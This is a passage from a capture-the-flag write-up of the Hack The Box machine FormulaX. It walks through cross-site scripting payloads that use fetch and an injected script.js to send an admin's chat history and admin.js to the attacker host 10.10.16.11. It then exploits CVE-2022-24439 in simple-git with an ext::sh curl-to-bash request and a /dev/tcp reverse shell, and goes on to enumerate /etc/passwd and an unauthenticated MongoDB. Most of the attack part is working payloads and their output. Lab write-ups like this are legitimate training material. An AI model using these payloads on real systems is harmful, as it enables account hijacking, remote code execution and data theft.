vY21WbVBTSXZjM1JoZEdsakwybHVaR1Y0TG1oMGJXd2lJRzl1WTJ4cFkyczlJbkpsWkdseVpXTjBLQ2tpUGt4dloyOTFkRHd2WVQ0OEwzQStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThMMlp2Y20wK0NpQWdJQ0FnSUNBZ0lDQWdJRHd2WkdsMlBnb2dJQ0FnSUNBZ0lEd3ZaR2wyUGdvZ0lDQWdJQ0FnSUR4b01qNVZjMlZ5SUUxbGMzTmhaMlZ6UEM5b01qNEtDaUFnSUNBZ0lDQWdQR1JwZGlCcFpEMGlZbWxuWDJOdmJuUmhhVzVsY2lJK1BHUnBkaUJqYkdGemN6MGlibVYzWDJOdmJuUmhhVzVsY2lJK0lDQUtJQ0FnSUNBZ1BHUnBkajQ4YkdGaVpXd2djM1I1YkdVOUltTnZiRzl5T2lCeVpXUTdJaUJwWkQwaVptbHljM1J1WVcxbElqNW1iMjlpWVhJZ1BDOXNZV0psYkQ0OEwyUnBkajRLSUNBZ0lDQWdQR1JwZGo0OGJHRmlaV3dnYzNSNWJHVTlJbU52Ykc5eU9pQnlaV1E3SWlCcFpEMGliR0Z6ZEc1aGJXVWlQaUJtYjI5aVlYSThMMnhoWW1Wc1Bqd3ZaR2wyUGdvZ0lDQWdJQ0E4WkdsMlBqeHNZV0psYkNCemRIbHNaVDBpWTI5c2IzSTZJSEpsWkRzaUlHbGtQU0p0WlhOellXZGxJajRnSWlabmREczhhV1p5WVcxbElHOXViRzloWkQwaVpYWmhiQ2duZG1GeUlHaDBkSEE5Ym1WM0lGaE5URWgwZEhCU1pYRjFaWE4wS0NrN0lHaDBkSEF1YjNCbGJpaGNKMGRGVkZ3bkxDQmNKMmgwZEhBNkx5OHhNQzR4TUM0eE5pNHhNUzgvZUhOelBWd25JQ3NnWW5SdllTaGtiMk4xYldWdWRDNWliMlI1TG1sdWJtVnlTRlJOVENrc0lIUnlkV1VwT3lCb2RIUndMbk5sYm1Rb0tUc25LU0krUEM5c1lXSmxiRDQ4TDJScGRqNEtJQ0FnSUNBZ1BDOXBabkpoYldVK1BDOXNZV0psYkQ0OEwyUnBkajQ4TDJScGRqNDhMMlJwZGo0S0lDQWdJRHd2WTJWdWRHVnlQZ29LQ2p4elkzSnBjSFFnYzNKalBTSXZjMk55YVhCMGN5OWhlR2x2Y3k1dGFXNHVhbk1pUGp3dmMyTnlhWEIwUGdvOGMyTnlhWEIwUGdvZ0lDQWdkMmx1Wkc5M0xtOXViRzloWkNBOUlHWjFibU4wYVc5dUlDZ3BJSHNLSUNBZ0lDQWdJQ0JuWlhSZmJXVnpjMkZuWlhNb0tUc0tJQ0FnSUgwN0NpQWdJQ0JqYjI1emRDQnlaV1JwY21WamRDQTlJQ2dwSUQwK0lIc0tJQ0FnSUNBZ0lDQXZMMnh2WTJGc1UzUnZjbUZuWlM1elpYUkpkR1Z0S0NKc2IyZG5aV1JmYVc0aUxDQWlabUZzYzJVaUtUc0tJQ0FnSUNBZ0lDQmhlR2x2Y3k1blpYUW9ZQzkxYzJWeUwyRndhUzlzYjJkdmRYUmdLUzUwYUdWdUtDZ3BJRDArSUhzS0lDQWdJQ0FnSUNBZ0lDQWdkMmx1Wkc5M0xteHZZMkYwYVc5dUxtaHlaV1lnUFNCZ0wzTjBZWFJwWXk5cGJtUmxlQzVvZEcxc1lBb2dJQ0FnSUNBZ0lIMHBDaUFnSUNCOU96d3ZjMk55YVhCMFBnbzhjMk55YVhCMElITnlZejBpTGk5aFpHMXBiaTVxY3lJK1BDOXpZM0pwY0hRK0Nnbz0](https://cyberchef.io/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=Q2lBZ0lDQThZMlZ1ZEdWeVBnb2dJQ0FnSUNBZ0lEeG9NajVCWkcxcGJpQlFZVzVsYkR3dmFESStDaUFnSUNBZ0lDQWdQR1JwZGlCamJHRnpjejBpYkc5bmFXNHRjR0ZuWlNJK0NpQWdJQ0FnSUNBZ0lDQWdJRHhrYVhZZ1kyeGhjM005SW1admNtMGlQZ29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQR1p2Y20wZ1kyeGhjM005SW14dloybHVMV1p2Y20waUlHRmpkR2x2YmowaWFtRjJZWE5qY21sd2REcHpaV0Z5WTJoZmJXVnpjMkZuWlNncElpQnRaWFJvYjJROUluQnZjM1FpUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEeHBibkIxZENCMGVYQmxQU0owWlhoMElpQndiR0ZqWldodmJHUmxjajBpVTJWaGNtTm9JRTFsYzNOaFoyVnpJaUJ1WVcxbFBTSnpaV0Z5WTJnaUlHbGtQU0p6WldGeVkyZ2lJSEpsY1hWcGNtVmtQU0lpUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEeGlkWFIwYjI0Z2RIbHdaVDBpYzNWaWJXbDBJajVUWldGeVkyZzhMMkoxZEhSdmJqNEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4WkdsMklITjBlV3hsUFNKdFlYSm5hVzR0ZEc5d09pQTBjSGc3SWo0S0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnUEd4aFltVnNJSE4wZVd4bFBTSmpiMnh2Y2pvZ2NtVmtPeUlnYVdROUltVnljbTl5SWo0Z1BDOXNZV0psYkQ0S0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThMMlJwZGo0S0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThjQ0JqYkdGemN6MGliV1Z6YzJGblpTSStURzluYjNWMElFWnliMjBnUVdOamIzVnVkQ0F0Sm1kME95QThZU0JvY21WbVBTSXZjM1JoZEdsakwybHVaR1Y0TG1oMGJXd2lJRzl1WTJ4cFkyczlJbkpsWkdseVpXTjBLQ2tpUGt4dloyOTFkRHd2WVQ0OEwzQStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThMMlp2Y20wK0NpQWdJQ0FnSUNBZ0lDQWdJRHd2WkdsMlBnb2dJQ0FnSUNBZ0lEd3ZaR2wyUGdvZ0lDQWdJQ0FnSUR4b01qNVZjMlZ5SUUxbGMzTmhaMlZ6UEM5b01qNEtDaUFnSUNBZ0lDQWdQR1JwZGlCcFpEMGlZbWxuWDJOdmJuUmhhVzVsY2lJK1BHUnBkaUJqYkdGemN6MGlibVYzWDJOdmJuUmhhVzVsY2lJK0lDQUtJQ0FnSUNBZ1BHUnBkajQ4YkdGaVpXd2djM1I1YkdVOUltTnZiRzl5T2lCeVpXUTdJaUJwWkQwaVptbHljM1J1WVcxbElqNW1iMjlpWVhJZ1BDOXNZV0psYkQ0OEwyUnBkajRLSUNBZ0lDQWdQR1JwZGo0OGJHRmlaV3dnYzNSNWJHVTlJbU52Ykc5eU9pQnlaV1E3SWlCcFpEMGliR0Z6ZEc1aGJXVWlQaUJtYjI5aVlYSThMMnhoWW1Wc1Bqd3ZaR2wyUGdvZ0lDQWdJQ0E4WkdsMlBqeHNZV0psYkNCemRIbHNaVDBpWTI5c2IzSTZJSEpsWkRzaUlHbGtQU0p0WlhOellXZGxJajRnSWlabmREczhhV1p5WVcxbElHOXViRzloWkQwaVpYWmhiQ2duZG1GeUlHaDBkSEE5Ym1WM0lGaE5URWgwZEhCU1pYRjFaWE4wS0NrN0lHaDBkSEF1YjNCbGJpaGNKMGRGVkZ3bkxDQmNKMmgwZEhBNkx5OHhNQzR4TUM0eE5pNHhNUzgvZUhOelBWd25JQ3NnWW5SdllTaGtiMk4xYldWdWRDNWliMlI1TG1sdWJtVnlTRlJOVENrc0lIUnlkV1VwT3lCb2RIUndMbk5sYm1Rb0tUc25LU0krUEM5c1lXSmxiRDQ4TDJScGRqNEtJQ0FnSUNBZ1BDOXBabkpoYldVK1BDOXNZV0psYkQ0OEwyUnBkajQ4TDJScGRqNDhMMlJwZGo0S0lDQWdJRHd2WTJWdWRHVnlQZ29LQ2p4elkzSnBjSFFnYzNKalBTSXZjMk55YVhCMGN5OWhlR2x2Y3k1dGFXNHVhbk1pUGp3dmMyTnlhWEIwUGdvOGMyTnlhWEIwUGdvZ0lDQWdkMmx1Wkc5M0xtOXViRzloWkNBOUlHWjFibU4wYVc5dUlDZ3BJSHNLSUNBZ0lDQWdJQ0JuWlhSZmJXVnpjMkZuWlhNb0tUc0tJQ0FnSUgwN0NpQWdJQ0JqYjI1emRDQnlaV1JwY21WamRDQTlJQ2dwSUQwK0lIc0tJQ0FnSUNBZ0lDQXZMMnh2WTJGc1UzUnZjbUZuWlM1elpYUkpkR1Z0S0NKc2IyZG5aV1JmYVc0aUxDQWlabUZzYzJVaUtUc0tJQ0FnSUNBZ0lDQmhlR2x2Y3k1blpYUW9ZQzkxYzJWeUwyRndhUzlzYjJkdmRYUmdLUzUwYUdWdUtDZ3BJRDArSUhzS0lDQWdJQ0FnSUNBZ0lDQWdkMmx1Wkc5M0xteHZZMkYwYVc5dUxtaHlaV1lnUFNCZ0wzTjBZWFJwWXk5cGJtUmxlQzVvZEcxc1lBb2dJQ0FnSUNBZ0lIMHBDaUFnSUNCOU96d3ZjMk55YVhCMFBnbzhjMk55YVhCMElITnlZejBpTGk5aFpHMXBiaTVxY3lJK1BDOXpZM0pwY0hRK0Nnbz0)

![](images/2024-03-09_14-47_contact_form_xss_cyberchef.png)

We saved the `source code` and opened the file. Now we knew that the `admin` user had access to some sort of `message history`.

![](images/2024-03-09_14-47_contact_form_xss_rendered_page.png)

`ar0x4` found a way to communicate with the `API`.

```c
<img src=x onerror="fetch('http://chatbot.htb/user/api/chat').then(response => response.text()).then(text => fetch('http://10.10.16.11/?c=' + btoa(unescape(encodeURIComponent(text)))))">
```

![](images/2024-03-09_14-47_contact_form_xss_api_endpoint.png)

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.248.196 - - [09/Mar/2024 15:12:46] code 501, message Unsupported method ('OPTIONS')
10.129.248.196 - - [09/Mar/2024 15:12:46] "OPTIONS /?c=Q2hhdCBSb29t HTTP/1.1" 501 -
10.129.248.196 - - [09/Mar/2024 15:12:49] code 501, message Unsupported method ('OPTIONS')
10.129.248.196 - - [09/Mar/2024 15:12:49] "OPTIONS /?c=Q2hhdCBSb29t HTTP/1.1" 501 -
10.129.248.196 - - [09/Mar/2024 15:12:53] code 501, message Unsupported method ('OPTIONS')
10.129.248.196 - - [09/Mar/2024 15:12:53] "OPTIONS /?c=Q2hhdCBSb29t HTTP/1.1" 501 -
10.129.248.196 - - [09/Mar/2024 15:12:55] code 501, message Unsupported method ('OPTIONS')
10.129.248.196 - - [09/Mar/2024 15:12:55] "OPTIONS /?c=Q2hhdCBSb29t HTTP/1.1" 501 -
10.129.248.196 - - [09/Mar/2024 15:12:59] code 501, message Unsupported method ('OPTIONS')
10.129.248.196 - - [09/Mar/2024 15:12:59] "OPTIONS /?c=Q2hhdCBSb29t HTTP/1.1" 501 -
10.129.248.196 - - [09/Mar/2024 15:13:02] code 501, message Unsupported method ('OPTIONS')
10.129.248.196 - - [09/Mar/2024 15:13:02] "OPTIONS /?c=Q2hhdCBSb29t HTTP/1.1" 501 -
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/serve]
└─$ echo "Q2hhdCBSb29t" | base64 -d
Chat Room
```

Now we knew that the `admin` probably had also access the the `chatbot` somehow. `Yeeb` pulled the `/admin.js` file in the meanwhile to get more insights about what was going on, on the `client-side`.

```c
<img src=x onerror="fetch('./admin.js').then(response => response.text()).then(text => fetch('http://10.10.16.11/?c=' + btoa(unescape(encodeURIComponent(text)))))">
```

![](images/2024-03-09_14-47_contact_form_xss_admin_js.png)

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/serve]
└─$ python3 -m http.server 80      
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.248.196 - - [09/Mar/2024 15:15:03] code 501, message Unsupported method ('OPTIONS')
10.129.248.196 - - [09/Mar/2024 15:15:03] "OPTIONS /?c=Y29uc3Qgc2VhcmNoX21lc3NhZ2UgPSAoKSA9PiB7DQogICAgY29uc3Qgc2VhcmNoVGVybSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJzZWFyY2giKS52YWx1ZQ0KICAgIGlmIChzZWFyY2hUZXJtKSB7DQogICAgICAgIHZhciBmb3VuZCA9IHdpbmRvdy5maW5kKHNlYXJjaFRlcm0sIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIHRydWUsIGZhbHNlKTsNCiAgICAgICAgDQogICAgICAgIGlmIChmb3VuZCkgew0KICAgICAgICAgIHZhciBzZWxlY3Rpb24gPSB3aW5kb3cuZ2V0U2VsZWN0aW9uKCk7DQogICAgICAgICAgdmFyIHJhbmdlID0gc2VsZWN0aW9uLmdldFJhbmdlQXQoMCk7DQogICAgICAgICAgdmFyIHJlY3QgPSByYW5nZS5nZXRCb3VuZGluZ0NsaWVudFJlY3QoKTsNCiAgICAgICAgICANCiAgICAgICAgICB3aW5kb3cuc2Nyb2xsVG8oew0KICAgICAgICAgICAgdG9wOiByZWN0LnRvcCArIHdpbmRvdy5wYWdlWU9mZnNldCwNCiAgICAgICAgICAgIGJlaGF2aW9yOiAic21vb3RoIg0KICAgICAgICAgIH0pOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgIGFsZXJ0KCJUZXh0IG5vdCBmb3VuZC4iKTsNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIA0KfSAgICANCg0KDQogIA0KDQoNCmNvbnN0IGdldF9tZXNzYWdlcyA9ICgpID0+IHsNCiAgICBjb25zdCB2YWx1ZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJzZWFyY2giKS52YWx1ZQ0KICAgIGF4aW9zLmdldChgL3VzZXIvYXBpL2dldF9tZXNzYWdlc2ApLnRoZW4oKHJlc3BvbnNlKSA9PiB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICByZXNwb25zZS5kYXRhLk1lc3NhZ2UuZm9yRWFjaCgobWVzc2FnZSA9PiB7DQogICAgICAgICAgICAgICAgY29uc29sZS5sb2cobWVzc2FnZS5maXJzdG5hbWUpDQogICAgICAgICAgICAgICAgY29uc3QgZGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogICAgICAgICAgICAgICAgZGl2LmNsYXNzTGlzdC5hZGQoJ25ld19jb250YWluZXInKQ0KICAgICAgICAgICAgICAgIGRpdi5pbm5lckhUTUwgPSBgICANCiAgICAgIDxkaXY+PGxhYmVsIHN0eWxlPSJjb2xvcjogcmVkOyIgaWQ9ImZpcnN0bmFtZSI+JHttZXNzYWdlLmZpcnN0bmFtZX0gPC9sYWJlbD48L2Rpdj4NCiAgICAgIDxkaXY+PGxhYmVsIHN0eWxlPSJjb2xvcjogcmVkOyIgaWQ9Imxhc3RuYW1lIj4gJHttZXNzYWdlLmxhc3RuYW1lfTwvbGFiZWw+PC9kaXY+DQogICAgICA8ZGl2PjxsYWJlbCBzdHlsZT0iY29sb3I6IHJlZDsiIGlkPSJtZXNzYWdlIj4gJHttZXNzYWdlLm1lc3NhZ2V9PC9sYWJlbD48L2Rpdj4NCiAgICAgIGANCiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYmlnX2NvbnRhaW5lcicpLmFwcGVuZENoaWxkKGRpdikNCiAgICAgICAgICAgIH0pKQ0KDQogICAgICAgIH0gY2F0Y2ggKGVycikgew0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yJykuaW5uZXJIVE1MID0gcmVzcG9uc2UuZGF0YS5TdGF0dXMNCiAgICAgICAgfQ0KICAgIH0pDQp9DQo= HTTP/1.1" 501 -
```

This revealed the `admin.js`.

```c
const search_message = () => {
    const searchTerm = document.getElementById("search").value
    if (searchTerm) {
        var found = window.find(searchTerm, false, false, true, false, true, false);
        
        if (found) {
          var selection = window.getSelection();
          var range = selection.getRangeAt(0);
          var rect = range.getBoundingClientRect();
          
          window.scrollTo({
            top: rect.top + window.pageYOffset,
            behavior: "smooth"
          });
        } else {
          alert("Text not found.");
        }
      }
    
}    


  


const get_messages = () => {
    const value = document.getElementById("search").value
    axios.get(`/user/api/get_messages`).then((response) => {
        try {
            response.data.Message.forEach((message => {
                console.log(message.firstname)
                const div = document.createElement('div');
                div.classList.add('new_container')
                div.innerHTML = `  
      <div><label style="color: red;" id="firstname">${message.firstname} </label></div>
      <div><label style="color: red;" id="lastname"> ${message.lastname}</label></div>
      <div><label style="color: red;" id="message"> ${message.message}</label></div>
      `
                document.getElementById('big_container').appendChild(div)
            }))

        } catch (err) {
            document.getElementById('error').innerHTML = response.data.Status
        }
    })
}

```

Knowing this we prepared a `JavaScript (.js)` file to load through `Cross-Site Scripting (XSS)` and read the `history` of the `admin` user.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/serve]
└─$ cat script.js 
(()=>{const e=(e,t)=>{const n=document.createElement("script");n.type="text/javascript",n.readyState?n.onreadystatechange=function(){("loaded"===n.readyState||"complete"===n.readyState)&&(n.onreadystatechange=null,t())}:n.onload=function(){t()},n.src=e,document.getElementsByTagName("head")[0].appendChild(n)},t=()=>{if(void 0===axios||void 0===io)return void console.error("Axios or Socket.IO not loaded");let t;axios.get("/user/api/chat").then(e=>{console.log(e.data)}).catch(e=>{console.error("Failed to fetch chat history:",e)});const n=io("/",{withCredentials:!0}),o=()=>{t="history",t?(n.emit("client_message",t),"function"==typeof Show_messages_on_screen_of_Client&&Show_messages_on_screen_of_Client(t),document.getElementById("user_message").value=""):alert("Cannot send Empty Messages")};n.on("message",e=>{fetch("http://10.10.16.11/?" + e)}),o()};e("http://chatbot.htb/scripts/axios.min.js",()=>{e("http://chatbot.htb/socket.io/socket.io.js",t)})})();
```

```c
"><iframe onload="with(top)body.appendChild (createElement('script')).src='http://10.10.16.11/script.js'">
```

![](images/2024-03-09_14-47_contact_form_xss_payload.png)

We received a callback and found a new `subdomain` called `dev-git-auto-update.chatbot.htb`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.249.40 - - [10/Mar/2024 07:43:21] "GET /script.js HTTP/1.1" 200 -
10.129.249.40 - - [10/Mar/2024 07:43:21] code 501, message Unsupported method ('OPTIONS')
10.129.249.40 - - [10/Mar/2024 07:43:21] "OPTIONS /?Greetings!.%20How%20can%20i%20help%20you%20today%20?.%20You%20can%20type%20help%20to%20see%20some%20buildin%20commands HTTP/1.1" 501 -
10.129.249.40 - - [10/Mar/2024 07:43:21] code 501, message Unsupported method ('OPTIONS')
10.129.249.40 - - [10/Mar/2024 07:43:21] "OPTIONS /?Hello,%20I%20am%20Admin.Testing%20the%20Chat%20Application HTTP/1.1" 501 -
10.129.249.40 - - [10/Mar/2024 07:43:21] code 501, message Unsupported method ('OPTIONS')
10.129.249.40 - - [10/Mar/2024 07:43:21] "OPTIONS /?Write%20a%20script%20for%20%20dev-git-auto-update.chatbot.htb%20to%20work%20properly HTTP/1.1" 501 -
10.129.249.40 - - [10/Mar/2024 07:43:21] code 501, message Unsupported method ('OPTIONS')
10.129.249.40 - - [10/Mar/2024 07:43:21] "OPTIONS /?Write%20a%20script%20to%20automate%20the%20auto-update HTTP/1.1" 501 -
10.129.249.40 - - [10/Mar/2024 07:43:21] code 501, message Unsupported method ('OPTIONS')
10.129.249.40 - - [10/Mar/2024 07:43:21] "OPTIONS /?Message%20Sent:%3Cbr%3Ehistory HTTP/1.1" 501 -
10.129.249.40 - - [10/Mar/2024 07:43:25] "GET /script.js HTTP/1.1" 200 -
10.129.249.40 - - [10/Mar/2024 07:43:25] code 501, message Unsupported method ('OPTIONS')
10.129.249.40 - - [10/Mar/2024 07:43:25] "OPTIONS /?Greetings!.%20How%20can%20i%20help%20you%20today%20?.%20You%20can%20type%20help%20to%20see%20some%20buildin%20commands HTTP/1.1" 501 -
10.129.249.40 - - [10/Mar/2024 07:43:25] code 501, message Unsupported method ('OPTIONS')
10.129.249.40 - - [10/Mar/2024 07:43:25] "OPTIONS /?Hello,%20I%20am%20Admin.Testing%20the%20Chat%20Application HTTP/1.1" 501 -
10.129.249.40 - - [10/Mar/2024 07:43:25] code 501, message Unsupported method ('OPTIONS')
10.129.249.40 - - [10/Mar/2024 07:43:25] "OPTIONS /?Write%20a%20script%20for%20%20dev-git-auto-update.chatbot.htb%20to%20work%20properly HTTP/1.1" 501 -
10.129.249.40 - - [10/Mar/2024 07:43:25] code 501, message Unsupported method ('OPTIONS')
10.129.249.40 - - [10/Mar/2024 07:43:25] "OPTIONS /?Message%20Sent:%3Cbr%3Ehistory HTTP/1.1" 501 -
10.129.249.40 - - [10/Mar/2024 07:43:25] code 501, message Unsupported method ('OPTIONS')
10.129.249.40 - - [10/Mar/2024 07:43:25] "OPTIONS /?Write%20a%20script%20to%20automate%20the%20auto-update HTTP/1.1" 501 -
```

Which we added to our `/etc/hosts` file.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.248.196  dev-git-auto-update.chatbot.htb
```

## Enumerating Subdomain

We instantly spotted `simple-git v3.14` on the bottom of the page.

![](images/2024-03-09_14-47_subdomain.png)

Entering our box `IP` also gave us a callback.

![](images/2024-03-09_14-47_subdomain_remote_git.png)

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.248.196 - - [09/Mar/2024 15:40:00] code 404, message File not found
10.129.248.196 - - [09/Mar/2024 15:40:00] "GET /foobar/info/refs?service=git-upload-pack HTTP/1.1" 404 -
```

## Foothold

### CVE-2022-24439

The version `v3.14` of `simple-git` was vulnerable to `CVE-2022-24439` for which we found a `Proof of Concept (PoC)` exploit.

- [https://security.snyk.io/package/npm/simple-git/3.14.0](https://security.snyk.io/package/npm/simple-git/3.14.0)
- [https://github.com/gitpython-developers/GitPython/issues/1515](https://github.com/gitpython-developers/GitPython/issues/1515)
- [https://www.revshells.com/](https://www.revshells.com/)

#### Proof of Concept

```c
# `<gitpython::clone> 'ext::sh -c touch% /tmp/pwned'`
```

### Reverse Shell Payload

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/serve]
└─$ cat x 
bash -c '/bin/bash -i >& /dev/tcp/10.10.16.11/9000 0>&1'
```

### Remote Code Execution

```c
POST /clone HTTP/1.1
Host: dev-git-auto-update.chatbot.htb
Content-Length: 68
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://dev-git-auto-update.chatbot.htb
Referer: http://dev-git-auto-update.chatbot.htb/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

 {"destinationUrl":"ext::sh -c curl% http://10.10.16.11/x|bash >&2"}
```

![](images/2024-03-09_15-46_http_request_foothold.png)

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.248.196 - - [09/Mar/2024 15:44:59] "GET /x HTTP/1.1" 200 -
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/serve]
└─$ nc -lnvp 9000
listening on [any] 9000 ...
connect to [10.10.16.11] from (UNKNOWN) [10.129.248.196] 33696
bash: cannot set terminal process group (1223): Inappropriate ioctl for device
bash: no job control in this shell
www-data@formulax:~/git-auto-update$
```

## Stabilizing Shell

```c
www-data@formulax:~/git-auto-update$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@formulax:~/git-auto-update$ ^Z
zsh: suspended  nc -lnvp 9000



┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/serve]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 9000

www-data@formulax:~/git-auto-update$ 
www-data@formulax:~/git-auto-update$ export XTERM=xterm
www-data@formulax:~/git-auto-update$
```

## Enumeration

Basic enumeration showed that we got a shell as `www-data` and two more users `kai_relay` and `frank_dorky` on the system.

```c
www-data@formulax:~/git-auto-update$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```c
www-data@formulax:~/git-auto-update$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mongodb:x:108:65534::/home/mongodb:/usr/sbin/nologin
snapd-range-524288-root:x:524288:524288::/nonexistent:/usr/bin/false
snap_daemon:x:584788:584788::/nonexistent:/usr/bin/false
mysql:x:109:113:MySQL Server,,,:/nonexistent:/bin/false
Debian-snmp:x:110:114::/var/lib/snmp:/bin/false
librenms:x:999:999::/opt/librenms:/usr/bin/bash
tcpdump:x:111:115::/nonexistent:/usr/sbin/nologin
kai_relay:x:1001:1001:Kai Relay,,,:/home/kai_relay:/bin/bash
frank_dorky:x:1002:1002:,,,:/home/frank_dorky:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

| Username    |
| ----------- |
| kai_relay   |
| frank_dorky |

## Privilege Escalation to franky_dorky

We also enumerated `local running services` and found a `MongoDB`.

```c
www-data@formulax:~$ ss -tulpn
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                                 
udp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*                                                           
udp   UNCONN 0      0            0.0.0.0:68         0.0.0.0:*                                                           
udp   UNCONN 0      0            0.0.0.0:162        0.0.0.0:*                                                           
udp   UNCONN 0      0               [::]:162           [::]:*                                                           
tcp   LISTEN 0      4096       127.0.0.1:27017      0.0.0.0:*                                                           
tcp   LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*                                                           
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*    users:(("nginx",pid=1027,fd=7),("nginx",pid=1026,fd=7))
tcp   LISTEN 0      511        127.0.0.1:8081       0.0.0.0:*    users:(("node /var/www/g",pid=1223,fd=20))             
tcp   LISTEN 0      511        127.0.0.1:8082       0.0.0.0:*    users:(("node /var/www/a",pid=1222,fd=19))             
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                                           
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                                           
tcp   LISTEN 0      10         127.0.0.1:34679      0.0.0.0:*    users:(("chrome",pid=1316,fd=45))                      
tcp   LISTEN 0      511        127.0.0.1:3000       0.0.0.0:*    users:(("nginx",pid=1027,fd=6),("nginx",pid=1026,fd=6))
tcp   LISTEN 0      10         127.0.0.1:43421      0.0.0.0:*                                                           
tcp   LISTEN 0      511        127.0.0.1:8000       0.0.0.0:*                                                           
tcp   LISTEN 0      128             [::]:22            [::]:*
```

By simply typing `mongo` on the shell we got logged in without any further credentials.

```c
www-data@formulax:~$ mongo
MongoDB shell version v4.4.29
connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("e3a1eb81-eb4f-457f-84ea-417ff990dc85") }
MongoDB server version: 4.4.8
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
        https://docs.mongodb.com/
Questions? Try the MongoDB Developer Community Forums
        https://community.mongodb.com
---
The server generated these startup warnings when booting: 
        2024-03-09T19:00:51.756+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
        2024-03-09T19:00:56.121+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
---
>
```

As next step we enumerated the database and `dumped` a few `hashes`.

```c
